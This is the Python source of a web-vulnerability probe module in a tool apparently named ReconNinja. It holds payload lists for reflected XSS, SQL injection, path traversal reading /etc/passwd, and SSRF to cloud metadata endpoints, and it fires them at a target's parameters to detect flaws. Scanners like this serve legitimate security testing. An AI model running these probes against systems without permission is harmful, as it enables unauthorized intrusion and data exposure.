"""
core/web_vulns.py — ReconNinja v8.0.0
Web Vulnerability Probe Suite — XSS, SQLi, LFI/RFI, SSRF.

Safe, non-destructive payload probes. All payloads are detection-only:
  - XSS: reflection probes (no alert execution)
  - SQLi: error-based and time-based detection (no data extraction)
  - LFI: path traversal response-size/content heuristics
  - SSRF: out-of-band detection via canary param values
"""

from __future__ import annotations

import re
import time
import urllib.parse
import urllib.request
import urllib.error
import ssl
from dataclasses import dataclass, field
from pathlib import Path

from utils.logger import safe_print


@dataclass
class WebVulnFinding:
    vuln_type: str        # xss / sqli / lfi / ssrf / open_redirect
    url: str
    parameter: str
    payload: str
    severity: str
    detail: str
    evidence: str = ""
    confidence: str = "medium"  # low / medium / high


@dataclass
class WebVulnsResult:
    target: str
    findings: list[WebVulnFinding] = field(default_factory=list)
    urls_tested: int = 0
    params_tested: int = 0


# ── payloads ──────────────────────────────────────────────────────────────────

XSS_PROBES = [
    '<script>RECONXSS</script>',
    '"><script>RECONXSS</script>',
    "';alert(RECONXSS)//",
    '<img src=x onerror=RECONXSS>',
    '{{RECONXSS}}',                    # template injection probe
    '${RECONXSS}',
]

SQLI_ERROR_PROBES = [
    "'",
    "''",
    "`",
    "' OR '1'='1",
    "' OR 1=1--",
    "1; SELECT 1",
    "1' AND 1=CONVERT(int,@@version)--",
]

SQLI_ERROR_PATTERNS = [
    re.compile(r"sql syntax", re.I),
    re.compile(r"mysql_fetch", re.I),
    re.compile(r"ORA-\d{5}", re.I),
    re.compile(r"pg_query\(\)", re.I),
    re.compile(r"SQLite3::", re.I),
    re.compile(r"Microsoft OLE DB", re.I),
    re.compile(r"Unclosed quotation mark", re.I),
    re.compile(r"quoted string not properly terminated", re.I),
    re.compile(r"You have an error in your SQL syntax", re.I),
]

LFI_PROBES = [
    "../../../../etc/passwd",
    "../../../../etc/passwd%00",
    "....//....//....//etc/passwd",
    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    "..%252f..%252f..%252fetc%252fpasswd",
    "../../../../windows/win.ini",
]

LFI_SIGNATURES = [
    re.compile(r"root:x:0:0:", re.I),
    re.compile(r"\[fonts\]", re.I),
    re.compile(r"for 16-bit app support", re.I),
    re.compile(r"/bin/(bash|sh|zsh)"),
]

SSRF_INTERNAL = [
    "http://169.254.169.254/latest/meta-data/",
    "http://metadata.google.internal/",
    "http://127.0.0.1/",
    "http://localhost/",
    "http://[::1]/",
    "http://0.0.0.0/",
]


# ── helpers ───────────────────────────────────────────────────────────────────

def _fetch(url: str, timeout: int = 6) -> tuple[int, str, float]:
    """Return (status_code, body, elapsed_seconds)."""
    start = time.monotonic()
    try:
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        req = urllib.request.Request(url)
        req.add_header("User-Agent", "ReconNinja/8.0.0 WebVulns")
        with urllib.request.urlopen(req, timeout=timeout, context=ctx) as resp:
            raw = resp.read(4096).decode(errors="ignore")
            return resp.status, raw, time.monotonic() - start
    except urllib.error.HTTPError as e:
        try:
            raw = e.read(1024).decode(errors="ignore")
        except Exception:
            raw = ""
        return e.code, raw, time.monotonic() - start
    except Exception:
        return 0, "", time.monotonic() - start


def _inject_param(url: str, param: str, value: str) -> str:
    """Replace a query-string param value."""
    parsed = urllib.parse.urlparse(url)
    qs = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
    qs[param] = [value]
    new_query = urllib.parse.urlencode(qs, doseq=True)
    return urllib.parse.urlunparse(parsed._replace(query=new_query))


def _extract_params(url: str) -> list[str]:
    parsed = urllib.parse.urlparse(url)
    return list(urllib.parse.parse_qs(parsed.query).keys())


def _crawl_forms(base_url: str, timeout: int) -> list[tuple[str, str]]:
    """Very light crawl — extract form action URLs and input names from homepage."""
    _, body, _ = _fetch(base_url, timeout)
    urls_params = []
    # Find forms
    action_pat = re.compile(r'<form[^>]*action=["\']?([^"\'> ]+)["\']?', re.I)
    input_pat = re.compile(r'<input[^>]*name=["\']?([^"\'> ]+)["\']?', re.I)
    for action in action_pat.findall(body):
        if not action.startswith("http"):
            action = base_url.rstrip("/") + "/" + action.lstrip("/")
        for name in input_pat.findall(body)[:5]:
            urls_params.append((action, name))
    return urls_params


# ── probe functions ───────────────────────────────────────────────────────────

def _probe_xss(base_url: str, params: list[tuple[str, str]], timeout: int) -> list[WebVulnFinding]:
    findings = []
    marker = "RECONXSS8"
    for url, param in params[:15]:
        for probe in XSS_PROBES[:3]:
            payload = probe.replace("RECONXSS", marker)
            test_url = _inject_param(url + f"?{param}=x" if "?" not in url else url, param, payload)
            _, body, _ = _fetch(test_url, timeout)
            if marker in body:
                findings.append(WebVulnFinding(
                    vuln_type="xss",
                    url=test_url,
                    parameter=param,
                    payload=payload,
                    severity="high",
                    detail="Reflected XSS — payload marker reflected unescaped in response body",
                    evidence=body[max(0, body.index(marker)-50):body.index(marker)+100],
                    confidence="high",
                ))
                break  # one finding per param is enough
    return findings


def _probe_sqli(base_url: str, params: list[tuple[str, str]], timeout: int) -> list[WebVulnFinding]:
    findings = []
    for url, param in params[:15]:
        base_url_w_param = url + f"?{param}=1" if "?" not in url else url
        _, base_body, base_time = _fetch(base_url_w_param, timeout)

        for probe in SQLI_ERROR_PROBES[:5]:
            test_url = _inject_param(base_url_w_param, param, probe)
            _, body, elapsed = _fetch(test_url, timeout)

            # Error-based detection
            for pat in SQLI_ERROR_PATTERNS:
                if pat.search(body) and not pat.search(base_body):
                    findings.append(WebVulnFinding(
                        vuln_type="sqli",
                        url=test_url,
                        parameter=param,
                        payload=probe,
                        severity="critical",
                        detail="SQL error triggered — error-based SQLi detected: "
                               f"'{pat.pattern}' in response",
                        evidence=body[:300],
                        confidence="high",
                    ))
                    break

            # Basic time-based: if probe causes >3s delay and baseline was fast
            if elapsed > 3.0 and base_time < 1.0:
                findings.append(WebVulnFinding(
                    vuln_type="sqli",
                    url=test_url,
                    parameter=param,
                    payload=probe,
                    severity="critical",
                    detail=f"Possible time-based SQLi — response delayed {elapsed:.1f}s vs baseline {base_time:.1f}s",
                    confidence="medium",
                ))

    return findings


def _probe_lfi(base_url: str, params: list[tuple[str, str]], timeout: int) -> list[WebVulnFinding]:
    findings = []
    for url, param in params[:10]:
        base_url_w_param = url + f"?{param}=test" if "?" not in url else url
        for probe in LFI_PROBES:
            test_url = _inject_param(base_url_w_param, param, probe)
            _, body, _ = _fetch(test_url, timeout)
            for sig in LFI_SIGNATURES:
                if sig.search(body):
                    findings.append(WebVulnFinding(
                        vuln_type="lfi",
                        url=test_url,
                        parameter=param,
                        payload=probe,
                        severity="critical",
                        detail=f"LFI confirmed — file content signature '{sig.pattern}' found in response",
                        evidence=body[:300],
                        confidence="high",
                    ))
                    break
    return findings


def _probe_ssrf(base_url: str, params: list[tuple[str, str]], timeout: int) -> list[WebVulnFinding]:
    findings = []
    for url, param in params[:8]:
        base_url_w_param = url + f"?{param}=https://example.com" if "?" not in url else url
        for payload in SSRF_INTERNAL[:3]:
            test_url = _inject_param(base_url_w_param, param,
                                     urllib.parse.quote(payload, safe=""))
            code, body, _ = _fetch(test_url, timeout)
            # IMDS response signatures
            imds_sigs = ["ami-id", "instance-id", "computeMetadata", "latest/meta-data"]
            if any(s in body for s in imds_sigs):
                findings.append(WebVulnFinding(
                    vuln_type="ssr",
                    url=test_url,
                    parameter=param,
                    payload=payload,
                    severity="critical",
                    detail="SSRF confirmed — cloud metadata service response detected",
                    evidence=body[:300],
                    confidence="high",
                ))
            elif code == 200 and len(body) > 100:
                findings.append(WebVulnFinding(
                    vuln_type="ssr",
                    url=test_url,
                    parameter=param,
                    payload=payload,
                    severity="high",
                    detail="Potential SSRF — internal URL fetched returned HTTP 200",
                    confidence="low",
                ))
    return findings


# ── main entry ────────────────────────────────────────────────────────────────

def web_vuln_scan(target: str, extra_urls: list[str], out_folder: Path,
                  timeout: int = 8) -> WebVulnsResult:
    """
    Run XSS, SQLi, LFI, and SSRF probes against the target and any
    discovered URLs passed in from previous phases.
    """
    if not target.startswith("http"):
        base_url = f"https://{target}"
    else:
        base_url = target

    result = WebVulnsResult(target=target)
    safe_print("[info]▶ Web Vuln Probes — XSS / SQLi / LFI / SSRF[/]")

    # Build param list: crawl forms from homepage + parse params from discovered URLs
    params: list[tuple[str, str]] = []
    params.extend(_crawl_forms(base_url, timeout))

    for url in extra_urls[:30]:
        for p in _extract_params(url):
            params.append((url, p))

    # Deduplicate
    params = list(dict.fromkeys(params))[:40]
    result.urls_tested = len({u for u, _ in params})
    result.params_tested = len(params)

    if not params:
        safe_print("  [dim]Web vulns: no injectable parameters found to test[/]")
        return result

    safe_print(f"  [dim]Testing {len(params)} params across {result.urls_tested} URLs...[/]")

    result.findings.extend(_probe_xss(base_url, params, timeout))
    result.findings.extend(_probe_sqli(base_url, params, timeout))
    result.findings.extend(_probe_lfi(base_url, params, timeout))
    result.findings.extend(_probe_ssrf(base_url, params, timeout))

    crit = sum(1 for f in result.findings if f.severity == "critical")
    high = sum(1 for f in result.findings if f.severity == "high")

    if result.findings:
        safe_print(f"  [danger]⚠  Web Vulns: {len(result.findings)} findings "
                   f"({crit} critical, {high} high)[/]")
    else:
        safe_print("  [dim]Web Vulns: no injection points confirmed[/]")

    # Save
    out_folder.mkdir(parents=True, exist_ok=True)
    out_file = out_folder / "web_vulns.txt"
    lines = ["# Web Vulnerability Probe Results\n",
             f"Target: {base_url}\n",
             f"Params tested: {result.params_tested}\n\n"]
    for f in result.findings:
        lines.append(f"[{f.severity.upper()}][{f.vuln_type.upper()}] — "
                     f"param: {f.parameter}\n")
        lines.append(f"  URL:     {f.url}\n")
        lines.append(f"  Payload: {f.payload}\n")
        lines.append(f"  Detail:  {f.detail}\n")
        if f.evidence:
            lines.append(f"  Evidence:{f.evidence[:120]}\n")
        lines.append("\n")
    out_file.write_text("".join(lines), encoding="utf-8")

    return result
